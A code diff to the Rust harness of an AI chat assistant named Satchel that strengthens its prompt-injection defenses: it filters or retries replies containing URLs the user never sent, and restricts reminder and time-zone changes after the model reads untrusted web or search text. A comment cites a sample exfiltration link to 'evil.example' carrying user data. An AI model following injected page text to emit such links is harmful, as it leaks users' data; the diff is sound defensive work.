@@ -24,6 +24,8 @@ const MAX_ATTEMPTS: i64 = 3;
 const SORRY: &str = "I couldn't save that. Send it again if you want it saved.";
 
 const REMINDER_EVENT_PREFIX: &str = "reminder:";
+/// Starts the text of a due reminder. Satchel stores it as a user message.
+const REMINDER_DUE: &str = "Reminder due: ";
 
 /// Seconds Satchel waits after a text for more texts. Texts sent together then get one reply.
 const DEBOUNCE: i64 = 2;
@@ -110,7 +112,7 @@ impl Harness {
                 "{REMINDER_EVENT_PREFIX}{}:{}",
                 reminder.id, reminder.schedule.due_at
             );
-            let mut content = format!("Reminder due: {}", reminder.content);
+            let mut content = format!("{REMINDER_DUE}{}", reminder.content);
             if let Some(urls) = &reminder.urls {
                 content.push('\n');
                 content.push_str(urls);
@@ -259,13 +261,14 @@ impl Harness {
             &self.prompt_context()?,
             &zone,
         )?;
-        let context_before_burst = context.len();
+        let context_length_before_burst = context.len();
         let saved = self.handle_burst(burst, message, &mut context).await?;
 
-        // Satchel fetches and sends only the URLs the user sent in the chat, and saved URLs.
+        // Satchel fetches and sends only the URLs the user sent in the chat, and saved URLs. A due
+        // reminder is a user message, but the model wrote its note.
         let mut user_urls = HashSet::new();
         for row in &chat {
-            if matches!(row.role, Role::User) {
+            if matches!(row.role, Role::User) && !row.content.starts_with(REMINDER_DUE) {
                 for link in Link::find_all(&row.content) {
                     user_urls.insert(link.url.to_string());
                 }
@@ -274,7 +277,8 @@ impl Harness {
 
         // `handle_burst` adds a `save` result when the burst has links or files. That text, a
         // search result, and a due reminder's note are not the user's own words.
-        let mut read_untrusted = message.is_reminder() || context.len() > context_before_burst;
+        let mut read_untrusted =
+            message.is_reminder() || context.len() > context_length_before_burst;
 
         let mut step = 0;
         let mut text = loop {
@@ -287,7 +291,21 @@ impl Harness {
                 )
                 .await?;
             step += 1;
-            if calls.is_empty() || step == MAX_STEPS {
+            if calls.is_empty() {
+                // A web page can ask for a reply link that carries the user's data, such as
+                // `https://evil.example/?code=4521`. The model writes the reply again without it.
+                let unknown_urls = self.unknown_urls(&text, &user_urls)?;
+                if unknown_urls.is_empty() || step == MAX_STEPS {
+                    break text;
+                }
+                let retry = format!(
+                    "Satchel did not send that reply. It has URLs the user did not send or save: {}. Write the reply again without them.",
+                    unknown_urls.join(", ")
+                );
+                context.push(json!({ "role": "system", "content": retry }));
+                continue;
+            }
+            if step == MAX_STEPS {
                 break text;
             }
 
@@ -302,9 +320,14 @@ impl Harness {
                     None => results.push(self.run_tool(call, burst, message, saved).await?),
                 }
             }
-            // The model sees a search or save result only in the next step.
-            for call in &calls {
-                if matches!(call, Ok(ToolCall::Search(_) | ToolCall::Save { .. })) {
+            // The model sees a search result, or a saved page's text, only in the next step.
+            for (call, result) in calls.iter().zip(&results) {
+                let reads_text = match call {
+                    Ok(ToolCall::Search(_)) => true,
+                    Ok(ToolCall::Save { urls, .. }) => !urls.is_empty(),
+                    _ => false,
+                };
+                if reads_text && matches!(result, ToolResult::Done(_)) {
                     read_untrusted = true;
                 }
             }
@@ -321,25 +344,16 @@ impl Harness {
             Agent::push_results(&mut context, results);
         };
 
-        // A web page can ask for a reply link that carries the user's data, such as
-        // `https://evil.example/?code=4521`. The reply drops each URL the user did not send or save.
-        let (mut reply_without_urls, urls) = Link::split(&text);
-        let mut kept_urls = Vec::new();
-        let mut dropped_a_url = false;
-        for url in urls {
-            if self.is_known_url(&url, &user_urls)? {
-                kept_urls.push(url);
-            } else {
-                console_error!("dropped {url} from the reply");
-                dropped_a_url = true;
-            }
-        }
-        if dropped_a_url {
-            for url in kept_urls {
-                if !reply_without_urls.is_empty() {
+        // The last step has no retry. Its unknown URLs are not sent.
+        let unknown_urls = self.unknown_urls(&text, &user_urls)?;
+        if !unknown_urls.is_empty() {
+            console_error!("dropped {unknown_urls:?} from the reply");
+            let (mut reply_without_urls, urls) = Link::split(&text);
+            for url in urls {
+                if !unknown_urls.contains(&url) {
                     reply_without_urls.push('\n');
+                    reply_without_urls.push_str(&url);
                 }
-                reply_without_urls.push_str(&url);
             }
             text = reply_without_urls;
         }
@@ -514,11 +528,31 @@ impl Harness {
             ToolCall::Settings { .. } | ToolCall::Cancel { .. } if read_untrusted => {
                 Ok(Some(UNTRUSTED_TURN.to_string()))
             }
-            ToolCall::Remind(remind) if read_untrusted && remind.id.is_some() => {
-                Ok(Some(UNTRUSTED_TURN.to_string()))
+            // A new reminder is fine. Moving one, or changing the saved time zone, is not.
+            ToolCall::Remind(remind) if read_untrusted => {
+                let changes_zone = match &remind.at_zone {
+                    Some(zone) => self.db.time_zone()?.as_deref() != zone.iana_name(),
+                    None => false,
+                };
+                if remind.id.is_some() || changes_zone {
+                    return Ok(Some(UNTRUSTED_TURN.to_string()));
+                }
+                Ok(None)
             }
             _ => Ok(None),
         }
+    }
+
+    /// The URLs in `text` that the user did not send in the chat or save.
+    fn unknown_urls(&self, text: &str, user_urls: &HashSet<String>) -> Result<Vec<String>> {
+        let (_, urls) = Link::split(text);
+        let mut unknown_urls = Vec::new();
+        for url in urls {
+            if !self.is_known_url(&url, user_urls)? {
+                unknown_urls.push(url);
+            }
+        }
+        Ok(unknown_urls)
     }
 
     /// Whether the user sent `url` in the chat, or saved it.
